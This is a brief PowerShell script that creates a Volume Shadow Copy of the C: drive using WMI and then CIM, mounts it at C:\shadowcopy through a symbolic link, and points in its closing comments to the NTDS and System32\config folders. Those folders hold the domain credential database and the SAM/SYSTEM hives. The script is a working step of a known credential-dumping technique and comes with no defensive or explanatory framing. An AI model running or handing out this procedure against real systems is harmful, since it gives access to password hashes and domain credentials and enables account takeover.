# Create shadowcopy for sensitive files

# Create Shadow Copy using WMI (legacy)
$TargetVolume = "C:"
$ShadowMount = "C:\shadowcopy"

# Create snapshot
$ShadowCopyClass = [wmiclass]"root\cimv2:Win32_ShadowCopy"
$Snapshot = $ShadowCopyClass.Create($TargetVolume, "ClientAccessible")

if ($Snapshot.ReturnValue -eq 0) {

    $Shadow = Get-WmiObject Win32_ShadowCopy |
        Where-Object { $_.ID -eq $Snapshot.ShadowID }

    $ShadowPath = $Shadow.DeviceObject + "\"

    # Remove old mount point if it exists
    if (Test-Path $ShadowMount) {
        Remove-Item $ShadowMount -Force
    }

    # Create symbolic link to shadow copy
    cmd /c "mklink /d `"$ShadowMount`" `"$ShadowPath`""
    
    Write-Host "Shadow copy mounted at $ShadowMount"
}
else {
    Write-Host "Failed to create shadow copy. Error code: $($Snapshot.ReturnValue)"
}

# Create Shadow Copy using CIM (modern PowerShell)

$TargetVolume = "C:"
$ShadowMount = "C:\shadowcopy"

$Snapshot = Invoke-CimMethod `
    -ClassName Win32_ShadowCopy `
    -MethodName Create `
    -Arguments @{
        Volume = $TargetVolume
        Context = "ClientAccessible"
    }

$Shadow = Get-CimInstance Win32_ShadowCopy |
    Where-Object { $_.ID -eq $Snapshot.ShadowID }

$ShadowPath = $Shadow.DeviceObject + "\"

cmd /c "mklink /d `"$ShadowMount`" `"$ShadowPath`""

# After mounting, access files through:

# C:\shadowcopy\Windows\NTDS\
# C:\shadowcopy\Windows\System32\config\
